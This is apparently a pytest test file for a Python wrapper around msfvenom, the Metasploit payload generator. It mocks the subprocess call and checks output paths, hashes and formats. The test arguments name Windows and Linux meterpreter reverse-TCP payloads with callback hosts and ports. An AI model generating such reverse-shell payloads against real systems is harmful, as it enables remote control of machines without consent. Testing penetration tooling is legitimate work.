from unittest.mock import patch, MagicMock
import hashlib
import subprocess
import tempfile
from pathlib import Path

import pytest

from spectrenet.wrappers.builtin.msfvenom import MsfvenomWrapper


FAKE_BYTES = b"\x90\x90\xcc"
FAKE_HASH = hashlib.sha256(FAKE_BYTES).hexdigest()


def _mock_run_and_file(mock_subprocess_run, mock_read_bytes, fmt="exe"):
    """Helper: configure mocks so run() succeeds."""
    mock_subprocess_run.return_value = MagicMock(returncode=0)
    mock_read_bytes.return_value = FAKE_BYTES


# ---------------------------------------------------------------------------
# parse()
# ---------------------------------------------------------------------------

def test_parse_returns_expected_dict(tmp_path):
    payload_file = tmp_path / "payload_abc12345.exe"
    payload_file.write_bytes(FAKE_BYTES)

    wrapper = MsfvenomWrapper()
    result = wrapper.parse(payload_file, "exe")

    assert result["payload_path"] == str(payload_file)
    assert result["hash"] == FAKE_HASH
    assert result["delivery_method"] == "exe"


def test_parse_delivery_method_comes_from_fmt_not_suffix(tmp_path):
    payload_file = tmp_path / "payload_abc12345.bin"
    payload_file.write_bytes(FAKE_BYTES)

    wrapper = MsfvenomWrapper()
    result = wrapper.parse(payload_file, "raw")

    assert result["delivery_method"] == "raw"


# ---------------------------------------------------------------------------
# run() — happy path
# ---------------------------------------------------------------------------

@patch.object(Path, "read_bytes", return_value=FAKE_BYTES)
@patch("spectrenet.wrappers.builtin.msfvenom.subprocess.run")
def test_run_returns_correct_schema(mock_subprocess_run, mock_read_bytes):
    mock_subprocess_run.return_value = MagicMock(returncode=0)

    wrapper = MsfvenomWrapper()
    result = wrapper.run(
        payload_type="windows/meterpreter/reverse_tcp",
        lhost="192.168.1.1",
        lport=4444,
        fmt="exe",
    )

    assert "payload_path" in result
    assert "hash" in result
    assert "delivery_method" in result
    assert result["hash"] == FAKE_HASH
    assert result["delivery_method"] == "exe"


@patch.object(Path, "read_bytes", return_value=FAKE_BYTES)
@patch("spectrenet.wrappers.builtin.msfvenom.subprocess.run")
def test_run_unique_filename_per_call(mock_subprocess_run, mock_read_bytes):
    """Each call must produce a different filename (no collision)."""
    mock_subprocess_run.return_value = MagicMock(returncode=0)

    wrapper = MsfvenomWrapper()
    kwargs = dict(
        payload_type="windows/meterpreter/reverse_tcp",
        lhost="10.0.0.1",
        lport=5555,
        fmt="exe",
    )
    result1 = wrapper.run(**kwargs)
    result2 = wrapper.run(**kwargs)

    assert result1["payload_path"] != result2["payload_path"]


# ---------------------------------------------------------------------------
# run() — output_dir=None falls back to tempfile.gettempdir()
# ---------------------------------------------------------------------------

@patch.object(Path, "read_bytes", return_value=FAKE_BYTES)
@patch("spectrenet.wrappers.builtin.msfvenom.subprocess.run")
def test_run_output_dir_none_uses_tempdir(mock_subprocess_run, mock_read_bytes):
    """When output_dir is None the file is placed in tempfile.gettempdir()."""
    mock_subprocess_run.return_value = MagicMock(returncode=0)

    wrapper = MsfvenomWrapper()
    result = wrapper.run(
        payload_type="linux/x86/meterpreter/reverse_tcp",
        lhost="10.0.0.1",
        lport=6666,
        fmt="elf",
        output_dir=None,
    )

    assert result["payload_path"].startswith(tempfile.gettempdir())


# ---------------------------------------------------------------------------
# run() — CalledProcessError is wrapped
# ---------------------------------------------------------------------------

@patch("spectrenet.wrappers.builtin.msfvenom.subprocess.run")
def test_run_wraps_called_process_error(mock_subprocess_run):
    mock_subprocess_run.side_effect = subprocess.CalledProcessError(
        returncode=1,
        cmd=["msfvenom"],
        stderr="Error: payload not found",
    )

    wrapper = MsfvenomWrapper()
    with pytest.raises(RuntimeError, match="msfvenom failed: Error: payload not found"):
        wrapper.run(
            payload_type="bad/payload",
            lhost="1.2.3.4",
            lport=9999,
        )
